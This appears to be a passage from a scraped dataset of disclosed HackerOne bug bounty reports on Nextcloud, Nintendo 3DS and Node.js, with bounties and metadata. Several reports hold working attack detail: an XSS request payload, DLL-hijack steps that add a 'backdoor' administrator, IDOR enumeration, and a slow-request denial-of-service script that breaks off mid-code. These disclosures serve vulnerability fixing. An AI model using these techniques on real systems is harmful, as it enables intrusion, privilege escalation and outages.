Proof of Concept & Additional Information:
Please check the attachment.
Detailed information is at 'FG-VD-17-063.txt (F188459)', FG-VD-17-063.txt.6 attachments:F188459: FG-VD-17-063.txtF188460: Figure_1._Nextcloud_cookies.jpgF188461: Figure_2._Logging_function.jpgF188462: Figure_3.1._PoC_request.jpgF188463: Figure_3.2._PoC_request_HEX.jpgF188464: Figure_4._Logs_has_been_deleted.jpg",https://hackerone.com/reports/232347,Baden-Württemberg,Germany,Stuttgart,2017,5,27,1,58
Nextcloud,11-50,0.0,1m-10m,$100.00,High,7.95,Improper Access Control - Generic,"""Secure View"" aka ""Hide Download"" can be bypassed easily","at5djl3pwjmunyutnoatp  submitted a report to Nextcloud.Feb 3rd (3 years ago)The mid-2019 announced feature ""Secure view"" (https://nextcloud.com/blog/secure-view-prevent-your-shared-files-from-getting-downloaded/) allows for hiding the Download button on public shares.
Even though the announcement admits that there are always workarounds out there to get hands on the file anyway, the workaround for this one is way too simple: Just add /download to the URL (like you used to for every public share) and your browser starts downloading unhesitently.
For the sharee, the checkbox ""Hide Download"" is therefore very deceptive, since they very likely weigh themselves in false safety.
Impact
Download a copy of a file or folder that's not supposed to be downloaded whatsoever Bot:  posted a comment. Feb 3rd (3 years ago)Thanks a lot for reporting this potential issue back to us!
Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.nickvergessen Nextcloud staff  changed the status to Needs more info. Feb 5th (3 years ago)Which version did you test against? We fixed this in November/December for 18.0.0, 17.0.3 and its siblings.at5djl3pwjmunyutnoatp   changed the status to New. Feb 6th (3 years ago)18.0.0 and 18.0.1 RC1nickvergessen Nextcloud staff  posted a comment. Feb 7th (3 years ago)Ah, I was thinking about the wrong feature (secure drop instead of secure view):
The following patch should fix the issue: https://github.com/nextcloud/server/pull/19349nickvergessen Nextcloud staff  changed the status to Triaged. Feb 7th (3 years ago)at5djl3pwjmunyutnoatp   posted a comment. Feb 10th (3 years ago)looks good, thank younickvergessen Nextcloud staff  closed the report and changed the status to Resolved. Feb 12th (3 years ago)Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.
Please let us know how you'd like to be credited in our official advisory. We require the following information:

Name / Pseudonym
Email address (optional)
Website (optional)
Company (optional)
Nextcloud  rewarded at5djl3pwjmunyutnoatp with a $100 bounty. Feb 13th (3 years ago)nickvergessen Nextcloud staff  requested to disclose this report. Mar 11th (3 years ago)  This report has been disclosed. Apr 10th (3 years ago)",https://hackerone.com/reports/788257,Baden-Württemberg,Germany,Stuttgart,2020,2,3,13,18
Nextcloud,11-50,0.0,1m-10m,$50.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,[Reflected XSS] In Request URL,"nstikhomirov  submitted a report to Nextcloud.Mar 26th (4 years ago)In index.php file on 1765 we can see XSS:
<a class=""button"" href=""<?php echo str_replace('/index.php', '/../', $updaterUrl); ?>"">
Because NextCloud allow links like: '/index.php/{ANY_CONTENT}'
If we will do request like: 
Code 182 BytesWrap lines Copy Download1POST /updater/index.php/h""><script>alert(1);</script> HTTP/1.1
2Host: vulns.local
3Content-Type: application/x-www-form-urlencoded
4Content-Length: 33
5
6updater-secret-input={OUR_SECRET}
We will see Reflected XSS: Screenshot_2.png (F452129)
To fix this vulnerability need to patch <a class=""button"" href=""<?php echo str_replace('/index.php', '/../', $updaterUrl); ?>""> to <a class=""button"" href=""<?php echo htmlspecialchars(str_replace('/index.php', '/../', $updaterUrl), ENT_QUOTES); ?>"">
Impact
If the attacker knows the secret phrase, then they can implode illegitimate html code in page1 attachment:F452129: Screenshot_2.png Bot:  posted a comment. Mar 26th (4 years ago)Thanks a lot for reporting this potential issue back to us!
Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.nickvergessen Nextcloud staff  changed the status to Triaged. Mar 26th (4 years ago)Thanks for your report, the maintainer of the updater has been notifiedbc4b4b814949a20af53fc55   changed the status to Triaged. Mar 26th (4 years ago)Hi Nikita,
thanks for this report. We fixed this and the updated version of the updater will be shipped with Nextcloud 14.0.9, 15.0.6 and 16.0.0 Beta 2.bc4b4b814949a20af53fc55   closed the report and changed the status to Resolved. Mar 26th (4 years ago)Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.
Please let us know how you'd like to be credited in our official advisory. We require the following information:

Name / Pseudonym
Email address (optional)
Website (optional)
Company (optional)
Nextcloud  rewarded nstikhomirov with a $50 bounty. Mar 26th (4 years ago)Hi Nikita, we would award you with $50, because the impact of this one is quite low due to the need of knowledge for the secret.nstikhomirov   posted a comment. Mar 26th (4 years ago)Thank you for bounty.
Information about me:

Nikita Tikhomirov
nstikhomirov@gmail.com
https://nstikhomirov.me/
Pentest Generation
nstikhomirov   posted a comment. Oct 21st (3 years ago)Excuse me, can you request CVE ID for this vulnerability?nickvergessen Nextcloud staff  posted a comment. Jan 31st (3 years ago)Sorry we forgot to request this. It is requested now and our advisory will be published at https://nextcloud.com/security/advisory/?id=NC-SA-2020-007 soonnickvergessen Nextcloud staff  requested to disclose this report. Jan 31st (3 years ago)  This report has been disclosed. Mar 1st (3 years ago)",https://hackerone.com/reports/515484,Baden-Württemberg,Germany,Stuttgart,2019,3,26,10,13
Nextcloud,11-50,0.0,1m-10m,$100.00,Medium,6.4,Improper Access Control - Generic,Access control issue -- [Allow file system access not validated when using session auth],born2hack  submitted a report to Nextcloud.Jul 30th (4 years ago),https://hackerone.com/reports/388515,Baden-Württemberg,Germany,Stuttgart,2018,7,30,15,4
Nextcloud,11-50,0.0,1m-10m,$150.00,Medium,6.5,Insecure Direct Object Reference (IDOR),"Access control missing while viewing the attachments in the ""All boards""","dpx01  submitted a report to Nextcloud.Jul 6th (2 years ago)The vulnerability lies in the ""view attachment"" of the tasks . When a user uploads the file to the Task, the attachment is given a numeric number and is increased +1 on further uploads. It is easy for any user to view and download all the files uploaded to the tasks by any user. The access is not controlled with the session or csrf token.
Steps to Reproduce:

Connect to the server login with user A and visit the webpage. I used the provider ""us.cloudamo.com""
Visit https://us.cloudamo.com/apps/deck and create a task.
Upload any file to the attachments and capture the request. The request will looks like ""https://us.cloudamo.com/apps/deck/cards/8420/attachment/30"" where 30 is the ID of the uploaded attachment. 
Login with  user B and access the URL and you should be able to view the attachment of user A.
Since the attachment IDs are numerical number with poor entropy can be easily brute-forced and  one can get all the uploaded attachments by all the users of the particular  provider.

Impact
Unauthorized user can view and download the files of other users. This may leak the sensitive information of users.2 attachments:F896401: IDOR_01.pngF896402: IDOR_02.png",https://hackerone.com/reports/916704,Baden-Württemberg,Germany,Stuttgart,2020,7,6,13,35
Nextcloud,11-50,0.0,1m-10m,$750.00,Medium,6.8,Information Disclosure,Access to all files of remote user through shared file,"xuesheng  submitted a report to Nextcloud.Aug 8th (5 years ago)Steps to reproduce

User A shares a file ""movie.mp4"" with user B.
User B uses webdav to access files (e.g. foldersync or nautilus)
share is shown as regular file (using webdav).
Copy the file and paste it to the same folder (still using webdav).
A new folder will appear with the name ""(1)movie.mp4"". This folder contains all data of user A (which is quite scary). Folder structure looks like: files, files_trashbin, cache, etc. (all user related files).
I was able to reproduce this with different combination of users and shared files.

Expected behaviour
Only the shared file should be copied.
Actual behaviour
All files of remote user are copied.
Server configuration
Operating system: Ubuntu 16.04.3 LTS
Web server: apache2 (2.4.18-2ubuntu3)
Database: mariadb (10.0.24-7)
PHP version: php7 (7.0+35ubuntu6)
Nextcloud version: 12.0.1
Updated from an older Nextcloud/ownCloud or fresh install: originally owncloud, upgradepath according to the official documentation to nextcloud (owncloud 9 to nextcloud 9 or 10, can't remember).
Where did you install Nextcloud from: Nextcloud package was downloaded from official webpage (nextcloud.com)
Signing status:
Code 43 BytesWrap lines Copy Download1<details>
2<summary>Signing status</summary>
Code 26 BytesWrap lines Copy Download1No errors have been found.
</details>
List of activated apps:
Code 37 BytesWrap lines Copy Download1<details>
2<summary>App list</summary>
Code 1.05 KiBWrap lines Copy Download1Enabled:
2  - activity: 2.5.2
3  - admin_audit: 1.2.0
4  - bookmarks: 0.10.1
5  - bruteforcesettings: 1.0.2
6  - calendar: 1.5.3
7  - comments: 1.2.0
8  - contacts: 1.5.3
9  - dav: 1.3.0
10  - federatedfilesharing: 1.2.0
11  - federation: 1.2.0
12  - files: 1.7.2
13  - files_accesscontrol: 1.2.4
14  - files_automatedtagging: 1.2.2
15  - files_external: 1.3.0
16  - files_pdfviewer: 1.1.1
17  - files_retention: 1.1.2
18  - files_sharing: 1.4.0
19  - files_texteditor: 2.4.1
20  - files_trashbin: 1.2.0
21  - files_versions: 1.5.0
22  - files_videoplayer: 1.1.0
23  - firstrunwizard: 2.1
24  - gallery: 17.0.0
25  - logreader: 2.0.0
26  - lookup_server_connector: 1.0.0
27  - mail: 0.6.4
28  - nextcloud_announcements: 1.1
29  - notifications: 2.0.0
30  - oauth2: 1.0.5
31  - password_policy: 1.2.2
32  - previewgenerator: 1.0.6
33  - provisioning_api: 1.2.0
34  - serverinfo: 1.2.0
35  - sharebymail: 1.2.0
36  - spreed: 2.0.1
37  - survey_client: 1.0.0
38  - systemtags: 1.2.0
39  - theming: 1.3.0
40  - twofactor_backupcodes: 1.1.1
41  - updatenotification: 1.2.0
42  - workflowengine: 1.2.0
43Disabled:
44  - encryption
45  - user_external
46  - user_ldap
</details>
Nextcloud configuration:
Code 42 BytesWrap lines Copy Download1<details>
2<summary>Config report</summary>
Code 1.80 KiBWrap lines Copy Download1{
2    ""system"": {
3        ""instanceid"": ""***REMOVED SENSITIVE VALUE***"",
4        ""passwordsalt"": ""***REMOVED SENSITIVE VALUE***"",
5        ""trusted_domains"": [
6            ""***REMOVED SENSITIVE VALUE***"",
7            ""***REMOVED SENSITIVE VALUE***"",
8            ""***REMOVED SENSITIVE VALUE***""
9        ],
10        ""datadirectory"": ""***REMOVED SENSITIVE VALUE***"",
11        ""dbtype"": ""mysql"",
12        ""version"": ""12.0.1.5"",
13        ""dbname"": ""owncloud"",
14        ""dbhost"": ""localhost"",
15        ""dbtableprefix"": ""oc_"",
16        ""dbuser"": ""***REMOVED SENSITIVE VALUE***"",
17        ""dbpassword"": ""***REMOVED SENSITIVE VALUE***"",
18        ""installed"": true,
19        ""forcessl"": true,
20        ""mail_smtpmode"": ""smtp"",
21        ""mail_smtpsecure"": ""ssl"",
22        ""mail_from_address"": ""***REMOVED SENSITIVE VALUE***"",
23        ""mail_domain"": ""***REMOVED SENSITIVE VALUE***"",
24        ""mail_smtpauthtype"": ""LOGIN"",
25        ""mail_smtpauth"": true,
26        ""mail_smtphost"": ""***REMOVED SENSITIVE VALUE***"",
27        ""mail_smtpport"": ""465"",
28        ""mail_smtpname"": ""***REMOVED SENSITIVE VALUE***"",
29        ""mail_smtppassword"": ""***REMOVED SENSITIVE VALUE***"",
30        ""theme"": """",
31        ""maintenance"": false,
32        ""logtimezone"": ""Europe\/Berlin"",
33        ""loglevel"": 0,
34        ""log_authfailip"": true,
35        ""overwrite.cli.url"": ""\/owncloud"",
36        ""secret"": ""***REMOVED SENSITIVE VALUE***"",
37        ""forceSSLforSubdomains"": true,
38        ""trashbin_retention_obligation"": ""30, 180"",
39        ""memcache.local"": ""\\OC\\Memcache\\APCu"",
40        ""memcache.locking"": ""\\OC\\Memcache\\Redis"",
41        ""redis"": {
42            ""host"": ""\/var\/run\/redis\/redis.sock"",
43            ""port"": 0,
44            ""dbindex"": 0,
45            ""password"": ""***REMOVED SENSITIVE VALUE***"",
46            ""timeout"": 1.5
47        },
48        ""htaccess.RewriteBase"": ""\/owncloud""
49    }
50}
</details>
Are you using external storage, if yes which one: not applicable
Are you using encryption: no
Are you using an external user-backend, if yes which one: no
Client configuration
Browser: Firefox 54.0
Operating system: Ubuntu 16.04.3 LTS
Logs
Web server error log
Code 49 BytesWrap lines Copy Download1<details>
2<summary>Web server error log</summary>
Code 27 BytesWrap lines Copy Download1No errors related to issue.
</details>
Nextcloud log (data/nextcloud.log)
Code 42 BytesWrap lines Copy Download1<details>
2<summary>Nextcloud log</summary>
Code 27 BytesWrap lines Copy Download1No errors related to issue.
</details>
Browser log
Code 40 BytesWrap lines Copy Download1<details>
2<summary>Browser log</summary>
Code 15 BytesWrap lines Copy Download1Not applicable.
</details>",https://hackerone.com/reports/258084,Baden-Württemberg,Germany,Stuttgart,2017,8,8,20,58
Nextcloud,11-50,0.0,1m-10m,$100.00,Low,2.0,None,Add to your nextcloud endpoint is not properly protected,"rtod  submitted a report to Nextcloud.May 11th (2 years ago)This is related to https://hackerone.com/reports/1173684
The endpoint you hit does have bruteforce protection
https://github.com/nextcloud/server/blob/master/apps/federatedfilesharing/lib/Controller/MountPublicLinkController.php#L126
But this is only triggered by finding a share that is password protected
https://github.com/nextcloud/server/blob/master/apps/federatedfilesharing/lib/Controller/MountPublicLinkController.php#L157
Or a file drop public share
https://github.com/nextcloud/server/blob/master/apps/federatedfilesharing/lib/Controller/MountPublicLinkController.php#L166
In other words this endpoint can also be used to try to brute force share tokens.
Impact
Low just like on the other report. But should be fixed non the less.",https://hackerone.com/reports/1192144,Baden-Württemberg,Germany,Stuttgart,2021,5,11,13,56
Nextcloud,11-50,0.0,1m-10m,$100.00,Low,2.0,None,Android app does not clear end to end encryption keys,"rtod  submitted a report to Nextcloud.May 8th (2 years ago)
userA on serverA sets up end to end encryption on their android device
userA has some end to end encrypted data
userA removes their account on serverA from their android device (for whatever reason)
attacker (evil admin) obtains the device of userA
attacker (evil admin) logs in on the account of userA  (reset the pw and just log in)
attacker (evil admin) can see and access all encrypted files

Impact
While I believe the impact is minimal since you need to obtain the device of the victim.
Once you remove your account all information regarding that account should be removed.

the keys
the mnemonic

And certainly when you re-add an account you should be asked to enter your mnemonic!",https://hackerone.com/reports/1189168,Baden-Württemberg,Germany,Stuttgart,2021,5,8,19,36
Nextcloud,11-50,0.0,1m-10m,$100.00,Medium,4.8,Code Injection,Arbitrary code execution in desktop client via OpenSSL config,"l00ph0le  submitted a report to Nextcloud.Jun 20th (3 years ago)Summary:
The nextcloud windows desktop application utilizes a precompiled OpenSSL library called libeay32.dll. This OpenSSL library attempts to load c:\usr\local\ssl\openssl.cnf when the nextcloud windows application is launched. The c:\usr\local\ssl\openssl.cnf file does not exist. By default, on windows systems, authenticated users can create under the c: drive. A user with low privileges can create the file c:\usr\local\ssl\openssl.cnf configuration file to load a nefarious .dll library, resulting in arbitrary code execution when the nextcloud windows application is launched (by any user including an administrator).
Description:
If you download sys internals process monitor, you can see the “nextcloud.exe” binary trying to read the files “c:\usr\local\ssl\openssl.cnf” and getting a result of “PATH NOT FOUND”. See attached openssl-not-found.png screenshot.
The root cause of the issue is when the OpenSSL library (libeay32.dll) was compiled, the parameter “--openssldir” was not specified. If this parameter is not specified, a default of “/usr/local/ssl” is used. This is a real directory in linux, but in windows it translates to c:\usr\local\ssl.
If a low privilege user creates the directory structure c:\usr\local\ssl\, copies an openssl.cnf file and malicious .dll library inside it will result is arbitrary code execution when the nextcloud application is executed. If the nextcloud application is executed by an administrator, it will result in privilege escalation.
I’ve included two example exploits;
Exploit example 1
calc.c – source code of my .dll file to execute calc.exe
calc.dll – compiled version of the calc.exe library
openssl-calc.cnf – openssl configuration file that calls the calc.dll
Exploit example 2
backdoor.c – source code my .dll file to create a local administrator, this uses a known uac bypass
backdoor.dll – compiled version of the local admin backdoor library
openssl-backdoor.cnf – openssl configuration file that calls the backdoor.dll
Platform(s) Affected:
All supported windows platforms that support Nextcloud Desktop 2.5.2
Steps To Reproduce:
Download and Install Nextcloud desktop 2.5.2 (https://nextcloud.com/install/#install-clients)
Exploit 1 – calc.exe – See attached video calc.mp4

Login with a low privileged user (part of Users group)
Open a cmd.exe and issue command: mkdir c:\usr\local\ssl
Copy calc.dll and openssl-calc.cnf to c:\usr\local\ssl directory
Rename c:\usr\local\ssl\openssl-calc.cnf to c:\usr\local\ssl\openssl.cnf
Logout of low privledged user.
Login with local administrator.
Launch Nextcloud application.
Calc.exe with execute.

Exploit 2 – create a local admin user (uac bypass) – See attached video backdoor.mp4

Login with a low privileged user (part of Users group)
Open a cmd.exe and issue command: mkdir c:\usr\local\ssl
Copy calc.dll and openssl-backdoor.cnf to c:\usr\local\ssl directory
Rename c:\usr\local\ssl\openssl-backdoor.cnf to c:\usr\local\ssl\openssl.cnf
Logout of low privledged user.
Login with local administrator.
Launch Nextcloud application.
Open “Computer Management”
Navigate to “System Tools” -> “Local Users and Groups” -> “Users”
A new user of “backdoor” with a password of “backdoor” was added.
Right click on “backdoor” and click “Properties”, then click “Member Of”. 
The “backdoor” user is part of the local administrator group.

Supporting Material/References:
https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR
How can the system be exploited with this bug?
DLL Hi-jacking can be used for many nefarious purposes. It can be used by malware to propagate and establish persistence on a workstation. It can be used to privilege escalation in the post exploitation phases of an attack.
How did you come across this bug ?
I can across this while looking for programs that utilize the windows openssl (libeay32.dll) library.
Recommendations for fix
Recompile the openssl library (libeay32.dll), and specify the parameter “—openssldir”. Set the directory to something a low privledge user can’t edit for example “C:\Program Files (x86)\Nextcloud”. Use the link in the support material / references part of this report.
Impact
Impact
The impact is high. Successful exploitation leads to arbitrary code execution on the windows system. There are many actions a nefarious individual could accomplish with this vulnerability. In addition to post-exploitation privilege escalation, another example could be ransomware, or other malware.9 attachments:F513310: backdoor-uac.cF513311: backdoor-uac.dllF513312: calc.cF513313: calc.dllF513314: backdoor.mp4F513315: openssl-backdoor.cnfF513316: openssl-calc.cnfF513317: calc.mp4F513318: openssl-not-found.png",https://hackerone.com/reports/622170,Baden-Württemberg,Germany,Stuttgart,2019,6,20,15,20
Nextcloud,11-50,0.0,1m-10m,$500.00,Critical,9.5,SQL Injection,Arbitrary SQL command injection,leonklingele  submitted a report to Nextcloud.Mar 12th (4 years ago),https://hackerone.com/reports/508487,Baden-Württemberg,Germany,Stuttgart,2019,3,12,15,42
Nextcloud,11-50,0.0,1m-10m,$100.00,Medium,5.3,Denial of Service,index.php/apps/files_sharing/shareinfo endpoint is not properly protected,"rtod  submitted a report to Nextcloud.Apr 24th (2 years ago)When federated shares between two Nextclouds are created they do not use standard webdav to communciate. But to obtain the filelist they seem to use the SERVER/index.php/apps/files_sharing/shareinfo endpoint.
Unlike the other endpoint for tokens (like public link shares). There is no brute force protection here. So this could be used as enumeration endpoint for available tokens. This is not likely to generate a hit due to the search space. But considering you do limit this on the public link endpoint for example it still seems relevant.
Now this brings me to the second part that struck me on this endpoint. It is essentially sending back the entire file tree below it. Meaning if this is a big file tree it you could just keep sending requests to the server keeping it quite busy. (and all requests are valid and won't be flagged). There is no rate limiting at all.
Then this brings me to the final part This endpoint accepts all token shares. Even link share tokens (meaning you don't even have to use the 'add to your Nextcloud'),  (and there is no check if federation is enabled). So in short. If you have a link share with a big file tree (or you create it yourself if there is write access).
Impact
Possible to perform denial of service attacks by sending a lot of valid request that could lead to a significant number of queries and memory usage on the system.",https://hackerone.com/reports/1173684,Baden-Württemberg,Germany,Stuttgart,2021,4,24,10,20
Nintendo,5001-10000,0.0,10m-50m,"$12,168.00",Critical,9.5,Improper Certificate Validation,[3DS][SSL] Improper certificate validation allows an attacker to perform MitM attacks,"mrnbayoh  submitted a report to Nintendo.Jun 9th (2 years ago)Summary by mrnbayohAffected Systems

Platform: (New) Nintendo 3DS
Region: ALL
System version: <= 11.13

Description
The SSL system module does not properly validate the x509 certificates when establishing an SSL/TLS connection. Actually, the SSL system module does not check the signatures when validating a certificate chain, allowing anyone to forge fake certificates and perform MitM attacks or spoof trusted servers.
Vulnerability
The SSL system module uses the RSA BSAFE MES library to implement SSL/TLS communications. This library is very customizable, and a lot of options can be turned on/off at multiple levels. In particular, according to the documentation, the library requires a ""resource list"" to be provided. The meaning of this list is to describe which aspects of the library will be activated or not.
Again, according to the documentation, the R_VERIFY_RES_SIGNATURE ""resource"" is needed to perform certificate signatures validation. However, this specific ""resource"" is not present in the list provided by the SSL module to the library. Hence, it does not validate certificate signatures even though the verification flag is set when creating SSL contexts, for example.
Impact
This vulnerability has a lot of impacts since it allows to spoof and perform MitM on any SSL/TLS connection established through the SSL module.
Here is a (probably non-exhaustive) list of what can done:

spoofing the NetUpdateSOAP and ECommerceSOAP endpoints used by the NIM module to:


bypass the system update verification
provide customized system updates packages (still need titles with CommonETickets)


this probably allows (untested) to install titles that came preinstalled on special editions like Super Smash Bros, Pokemon games, Zelda games etc.


spoofing the eShop servers, providing a new attack surface (eShop app)
MitM eShop communications to:


get user information & tokens
spy on commercial transactions
get user banking information (?)(untested)


MitM Friends & ACT communications to:


get user tokens & information (including NNID credentials)


spoofing connections to some game servers, providing new attack surfaces
MitM connections to some game servers, allowing to spy on communications
MitM/spoofing any other connection using the SSL module to establish SSL/TLS communications

And some things that cannot be done:

it is impossible to modify downloaded SpotPass data which are protected due to the signature verification of BOSS containers
it is impossible to spoof servers or doing MitM attacks when applications use some kind of webkit implementation, due to webkit having its own SSL/TLS implementation
Show more",https://hackerone.com/reports/894922,Washington,United States,Redmond,2020,6,9,22,45
Nintendo,5001-10000,0.0,10m-50m,"$2,738.00",Critical,9.5,Heap Overflow,[3DS][StreetPass] Buffer Overflow in Super Mario Maker level decompression,"mrnbayoh  submitted a report to Nintendo.Sep 4th (3 years ago)tattsun Nintendo staff  changed the status to Triaged. Sep 5th (3 years ago)tattsun Nintendo staff  posted a comment. Sep 26th (3 years ago)Nintendo  rewarded mrnbayoh with a $2,738 bounty. Jan 10th (3 years ago)tattsun Nintendo staff  closed the report and changed the status to Resolved. Jan 10th (3 years ago)mrnbayoh   requested to disclose this report. Mar 24th (2 years ago)tattsun Nintendo staff  posted a comment. Mar 26th (2 years ago)mrnbayoh   posted a comment. Apr 20th (2 years ago)tattsun Nintendo staff  agreed to disclose this report. Apr 20th (2 years ago)  This report has been disclosed. Apr 20th (2 years ago)Summary by mrnbayohInformation

Platform: (New) Nintendo 3DS 
Region: EU (all regions are affected)
System version: less or equal to 11.10 (latest)

Description
Since the bootroms have been dumped, it is now possible for an attacker to decrypt streetpass communications. Super Mario Maker is vulnerable to a buffer overflow vulnerability when parsing received levels.
Vulnerability
When parsing a compressed level received via StreetPass, the application decompress each compressed chunk of the file. The size of the received file cannot exceed 0x18000 bytes but the size isn't checked so the application will try to parse past the end of the compressed buffer if a greater size is provided. Even though we cannot send more than 0x18000 bytes, the decompressed buffer is located just after the compressed buffer.
Thus, one can craft a file where the first chunk is 0x18000 bytes long, the decompressed part is copied to compressed_buf+0x18000 and since the size isn't checked, the content at compressed_buf+0x18000 is parsed as the next compressed chunk and eventually copied past the end of the decompressed buffer. This makes it possible to overwrite objects on the heap and gain code execution.
Impact
This gives an attacker the ability to get userland remote code execution in Super Mario Maker.",https://hackerone.com/reports/687887,Washington,United States,Redmond,2019,9,4,15,50
Node.js,11-50,0.0,1m-10m,$150.00,Low,2.0,Improper Certificate Validation,"Built-in TLS module unexpectedly treats ""rejectUnauthorized: undefined"" as ""rejectUnauthorized: false"", disabling all certificate validation","pimterry  submitted a report to Node.js.Jul 26th (about 1 year ago)
NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

Summary: ""rejectUnauthorized: false"" disables all TLS validation, and should not be set in almost all circumstances. The documentation says only the specific 'false' value will disable this validation, but in fact a 'undefined' value does also disables it, unexpectedly disabling TLS entirely.
Description:
The documentation for tls.connect (https://nodejs.org/api/tls.html#tls_tls_connect_options_callback) says:

rejectUnauthorized <boolean> If not false, the server certificate is verified against the list of supplied CAs. An 'error' event is emitted if verification fails; err.code contains the OpenSSL error code. Default: true.

This is not true (see repro below) - in addition to false, an explicit undefined value does also disable server certificate verification.
This is very problematic, because it's reasonable to assume that undefined will be equivalent to setting the default, and it's also easy to accidentally produce undefined fields when dynamically building configuration. In any system that has done so, they are unknowingly silently not validating any TLS connections.
I've discovered this because I've found that https://www.npmjs.com/package/global-agent does exactly this (uses explicit undefineds when building options objects) and it is vulnerable because of this issue (i.e. all users of that package are by default unintentionally not validating TLS certificates for all connections).
This appears to affect all active node versions. Unless I'm missing something, this seems very bad.
Steps To Reproduce:
Repro code:
Code 259 BytesWrap lines Copy Download1const https = require('https');
2const request = https.get('https://expired.badssl.com', { rejectUnauthorized: undefined });
3request.on('error', (e) => console.log('Request failed:', e.message));
4request.on('response', (e) => console.log('Request succeeded'));

Run the above
The request succeeds! It should not, because expired.badssl.com by design has an expired TLS certificate
Remove the { rejectUnauthorized: undefined } option, or change it to 'true'
It fails, as expected, due to an expired certificate.

Impact:
This breaks all TLS and HTTPS security for anybody who accidentally provides an undefined value, assuming it will be equivalent to providing no value at all.
Impact
Breaks all HTTPS protections, so complete disclosure or trivial manipulation of all HTTPS requests and responses by anybody capable of MITMing the TCP connection.",https://hackerone.com/reports/1278254,California,United States,San Francisco,2021,7,26,16,29
Node.js,11-50,0.0,1m-10m,$250.00,Medium,5.45,Classic Buffer Overflow,`fs.realpath.native` on darwin may cause buffer overflow,"ashi009  submitted a report to Node.js.Aug 24th (2 years ago)
NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

Summary: 
The libuv's implementation of realpath is flawed on darwin and may cause buffer overflow.
Description: 
libuv's realpath implementation determines the buffer size with pathconf and fallback to _POSIX_PATH_MAX (256) if that fails for any reason (eg. ENOENT). However realpath requires a buffer of at least PATH_MAX (1024) bytes to be used, hence causes the buffer overflow if the resolved path is longer than 256 bytes.
Steps To Reproduce:

LONG_PATH='/tmp/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/long/path/254B'
SHORT_LINK='/tmp/short'
mkdir -p ""${LONG_PATH}""
ln -s ""${LONG_PATH}"" ""${SHORT_LINK}""
node -e ""fs.realpathSync.native('${SHORT_LINK}/file-not-exist')""

Impact:
Cause node process to crash.
Supporting Material/References:

https://github.com/bazelbuild/rules_nodejs/issues/1958
https://github.com/libuv/libuv/issues/2965
https://github.com/libuv/libuv/issues/2966

Impact
Given that nodejs on darwin are mostly desktop applications and used as developer tools, exploit this is very unlikely to cause more damage than an application crash.",https://hackerone.com/reports/965914,California,United States,San Francisco,2020,8,24,15,18
Node.js,11-50,0.0,1m-10m,$250.00,Critical,9.3,Denial of Service,Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests,"shogunpanda  submitted a report to Node.js.May 8th (3 years ago)Summary: Node.js is vulnerable to HTTP denial of service (DOS) attacks based on delayed requests submission which can make the server unable to accept new connections.
Description:
An attacker can open an arbitrary number of HTTP connections and keep the server busy by never completing the request phase.
Node.js only has two requests timeouts:

server.timeout that controls the maximum number of milliseconds the socket can be idle. This also includes the server processing time. 
server.headersTimeout (Added in Node 11.3.0), that controls the maximum number of milliseconds allowed to receive the full request headers before timing out.

Handling of request bodies is specific to the application code and core Node.js never consumes or parses the request bodies. 
Currently, the body parsing and handling is performed by the following modules:

fastify
restify
busboy, used by fastify-multpart and multer
raw-body, used by body-parser

All of the modules above are vulnerable to the attack.
If part of the body is already sent, the body parsing modules above can be patched to impose a request body sending timeout and therefore mitigate the attack.
The application unfortunately can not completely handle this attack. If the attacker never starts sending the body after completing the submission of the headers, the application code is never invoked. 
Prior to Node.js 13.0.0, the default timeout for a request was 2 minutes, which is a countermeasure against this attack.
Starting with Node.js 13.0.0 instead, the default timeout has been changed to be 0 (which means no timeout) in order to address serverless deployments where long running requests are needed. Since the socket is never considered idle, the application is completely vulnerable to the attack.
While server.headersTimeout is able to detect a slow request, it is only effective if the delay happens during the headers phase (like in Slowloris attacks). If the attacker delays the start of the headers, the start of body sending or sends the body very slow without resulting in an idle socket, the attack is not detected.
In the long run an unprotected server will have a lot of pending requests to handle. At some point it will reach the open connections limit and therefore will not be able to serve additional requests, resulting in a Denial of Service.
Steps To Reproduce:

From one or more attacking sources, open one or more HTTP connections to the target server
For each of the connection in step 1
2.1. (Optional) Wait a certain amount of time before sending the first request header.
2.2 Send all request headers with regular pausing.
2.3 (Optional) Wait a certain amount of time before sending the body data.
2.4. Send the request body with regular pausing.

All the substeps must be performed by sending periodically the smallest amount of data with the highest delay such that the server does not detect an idle socket. For Node 13.0.0 and above there is no idle timeout by default, so the attacker can wait an arbitrary time. For Node.js prior to 13.0.0, at least one byte each 2 minutes must be sent.
We have tested the following test cases:

Connection established, none or partial headers sent then sending is paused: If server.timeout is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.
Connection established, headers sent with long delays: server.headersTimeout is triggered and closes the connection with no response. 
Connection established, headers sent and sending is paused before starting the body: If server.timeout is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.
Connection established, headers sent, body sent with long delays: server.timeout is not able to detect the attack and the server is completely vulnerable to the attack.

What follows is a sample code which reproduces the problem. 
Code 1.06 KiBWrap lines Copy Download1const { createConnection } = require('net')
2
3let start
4let response = ''
5let body = ''.padEnd(4096, '123')
6
7const client = createConnection({ port: parseInt(process.argv[2], 10) }, () => {
8  start = process.hrtime.bigint()
9
10  // Send all the headers quickly so that server.headersTimeout is not triggered
11  client.write('POST / HTTP/1.1\r\n')
12  client.write('Content-Type: text/plain\r\n')
13  client.write(`Content-Length: ${Buffer.byteLength(body)}\r\n`)
14  client.write(`\r\n`)
15
16  // Send the body very slower but in away that the server.timeout is not triggered
